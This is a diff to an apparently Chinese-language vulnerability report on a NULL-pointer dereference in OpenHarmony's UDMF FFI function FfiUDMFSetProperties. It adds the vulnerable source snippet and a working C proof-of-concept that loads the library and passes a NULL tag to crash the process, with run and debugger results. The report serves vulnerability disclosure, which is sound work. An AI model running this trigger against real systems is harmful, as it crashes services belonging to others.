@@ -3188,7 +3188,29 @@ index 1f6da4b212296..329d4bfa3e17c 100644
 | CVE 编号 | （新发现） |
 | CWE 分类 | CWE-476 |
 
-> 源码片段：见 `foundation/distributeddatamgr/udmf/interfaces/cj/src/unified_data_ffi.cpp`（关键行号 [134]）。本仓库未捆绑源码树；在案例目录放置 `source_snippet.txt` 后重新生成即可嵌入内容。
+> 源码片段（`foundation/distributeddatamgr/udmf/interfaces/cj/src/unified_data_ffi.cpp` 关键行号 [134]，摘自案例目录 `source_snippet.c`）：
+
+```c
+// unified_data_ffi.cpp:124-137 (interfaces/cj/src, build commit a4882ad7,
+// per case.json oh_source.build_provenance). Line 134 is the candidate:
+// properties.tag flows unchecked into Utils::MallocCString, whose const
+// std::string& parameter builds std::string(nullptr) -> strlen(NULL).
+void FfiUDMFSetProperties(int64_t unifiedDataId, CUnifiedDataProperties properties)
+{
+    auto data = FFIData::GetData<CUnifiedData>(unifiedDataId);
+    if (data == nullptr) {
+        return;
+    }
+    auto prop = data->unifiedData_->GetProperties();
+    AAFwk::WantParams wantP;
+    SetDataParameters(properties.extras, wantP);
+    prop->extras = wantP;
+    prop->tag = Utils::MallocCString(properties.tag);
+    prop->shareOptions = UDMF::ShareOptions(properties.shareOptions);
+    data->unifiedData_->SetProperties(prop);
+}
+
+```
 
 ### 2. 漏洞详细描述
 
@@ -3200,7 +3222,100 @@ FfiUDMFSetProperties 对 properties.tag 未判空即传入 Utils::MallocCString�
 
 ### 3. PoC 源代码
 
-> ⚠️ 本案 PoC 为源码级对照验证，无可执行触发器（原因见下）
+```c
+/* Malformed-input client for the OpenHarmony x86_64 CJ UDMF exported ABI.
+ * ABI source: udmf interfaces/cj/include/unified_data_impl.h
+ *   CParameters { int8_t valueType; char* key; void* value; int64_t size; }
+ *   CArrParameters { CParameters* head; int64_t size; }
+ *   CUnifiedDataProperties { CArrParameters extras; char* tag; int64_t timestamp; int32_t shareOptions; }
+ * Type codes (interfaces/cj/src/unified_data_parameter_parse.cpp:34-39):
+ *   I32_TYPE=0 I64_TYPE=1 DOUBLE_TYPE=2 BOOL_TYPE=3 STR_TYPE=4 UINT8_ARRAY_TYPE=5
+ *
+ * Candidate A (stale, expected falsified on this snapshot):
+ *   SetDataParameters enters head+i loop — current code guards head==nullptr
+ *   (unified_data_parameter_parse.cpp SetDataParameters first if-statement).
+ * Candidate B (under test, expected crash):
+ *   FfiUDMFSetProperties -> prop->tag = Utils::MallocCString(properties.tag)
+ *   (interfaces/cj/src/unified_data_ffi.cpp FfiUDMFSetProperties body);
+ *   MallocCString takes const std::string& (interfaces/cj/src/utils.cpp:18),
+ *   so tag==NULL constructs std::string(nullptr) -> strlen(NULL) SIGSEGV.
+ *   Note FfiUDMFGetProperties returns tag=nullptr for an empty stored tag,
+ *   i.e. the getter's own output is not valid setter input (round-trip crash).
+ * Prerequisite: FfiUDMFUnifiedDataConstructor() must return a valid id.
+ * No target implementation is copied into this client.
+ *
+ * Case matrix (sequential single process; the crash case is placed last so
+ * earlier cases' done-markers give crash attribution):
+ *   0  extras{valid 1 param I32, size=1} + tag="rt-tag"   control
+ *   1  extras{head=NULL, size=3}          + tag="rt-tag"  stale candidate
+ *   2  extras{head=NULL, size=0}          + tag="rt-tag"  zero-size control
+ *   3  extras{valid 1 param I32, size=1}  + tag=NULL      candidate B
+ */
+#define _GNU_SOURCE
+#include <dlfcn.h>
+#include <stddef.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <string.h>
+
+typedef struct { int8_t valueType; char *key; void *value; int64_t size; } CParameters;
+typedef struct { CParameters *head; int64_t size; } CArrParameters;
+typedef struct {
+    CArrParameters extras;
+    char *tag;
+    int64_t timestamp;
+    int32_t shareOptions;
+} CUnifiedDataProperties;
+
+_Static_assert(sizeof(void *) == 8, "x86_64 caller required");
+
+int main(int argc, char **argv)
+{
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+    if (argc != 2) return 2;
+    void *library = dlopen(argv[1], RTLD_NOW | RTLD_LOCAL);
+    if (!library) { fprintf(stderr, "load_error=%s\n", dlerror()); return 3; }
+
+    int64_t (*constructor)(void) =
+        (int64_t (*)(void))dlsym(library, "FfiUDMFUnifiedDataConstructor");
+    void (*set_props)(int64_t, CUnifiedDataProperties) =
+        (void (*)(int64_t, CUnifiedDataProperties))dlsym(library, "FfiUDMFSetProperties");
+    if (!constructor || !set_props) { fputs("missing UDMF export\n", stderr); return 4; }
+
+    puts("stage=env_probe start");
+    int64_t data_id = constructor();
+    printf("stage=env_probe constructor id=%lld\n", (long long)data_id);
+    if (data_id <= 0) { puts("stage=env_probe failed"); return 10; }
+    puts("stage=env_probe ok");
+
+    CParameters valid_param = { 0 /*I32_TYPE*/, "k0", NULL, 0 };
+    int32_t valid_val = 42;
+    valid_param.value = &valid_val;
+
+    const struct {
+        CUnifiedDataProperties props;
+        const char *name;
+    } cases[] = {
+        { { { &valid_param, 1 },  "rt-tag", 0, 1 }, "valid_control" },
+        { { { NULL, 3 },           "rt-tag", 0, 1 }, "null_head_size3_stale_candidate" },
+        { { { NULL, 0 },           "rt-tag", 0, 1 }, "null_head_size0_control" },
+        { { { &valid_param, 1 },  NULL,     0, 1 }, "null_tag_candidate" },
+    };
+
+    for (size_t k = 0; k < sizeof(cases) / sizeof(cases[0]); k++) {
+        printf("case=%zu name=%s start head=%p tag=%s size=%lld\n", k, cases[k].name,
+               (void *)cases[k].props.extras.head,
+               cases[k].props.tag ? cases[k].props.tag : "(null)",
+               (long long)cases[k].props.extras.size);
+        set_props(data_id, cases[k].props);
+        printf("case=%zu name=%s done\n", k, cases[k].name);
+    }
+    puts("malformed_matrix=completed_no_crash");
+    return 0;
+}
+
+```
 
 **PoC 使用方法**：
 真库运行级：libcj_unified_data_channel_ffi.z.so（官方完整树构建，317/317 全绿，sha256 773867c9...213ee59）dlopen 驱动 tools/validation_cases/udmf_null_tag.c：case0-2 对照/证伪 不崩（含旧候选 extras.head=NULL 证伪）；case3（tag=NULL）→ SIGSEGV（run.exit=139）；gdb add-symbol-file 符号化 #0 strlen → #3 FfiUDMFSetProperties（unified_data_ffi.cpp:134）。evidence zip sha256 a70accc9...14df（run1+run2+MANIFEST）。
